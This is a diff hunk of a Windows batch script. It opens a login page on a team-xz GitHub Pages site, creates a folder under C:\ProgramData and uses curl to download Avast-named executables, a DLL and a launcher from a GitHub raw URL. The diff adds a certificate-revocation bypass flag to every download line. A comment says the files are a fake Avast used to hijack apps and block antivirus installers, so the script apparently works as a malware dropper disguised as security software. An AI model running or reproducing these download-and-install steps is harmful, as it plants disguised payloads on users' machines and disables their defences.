@@ -67,12 +67,12 @@ start https://team-xz.github.io/login.html
 cd C:\ProgramData
 mkdir pawast
 cd pawast
-curl -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.deps.json
-curl -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.dll
-curl -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.exe
-curl -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.pdb
-curl -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.runtimeconfig.json
-curl -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/launcher.exe
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.deps.json
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.dll
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.exe
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.pdb
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/Avast.runtimeconfig.json
+curl --ssl-no-revoke -L -O https://raw.githubusercontent.com/team-xz/team-xz.github.io/refs/heads/main/dl/launcher.exe
 
 :: ========================================================================
 :: Hijacking some apps with fake avast (also blocks av installers)
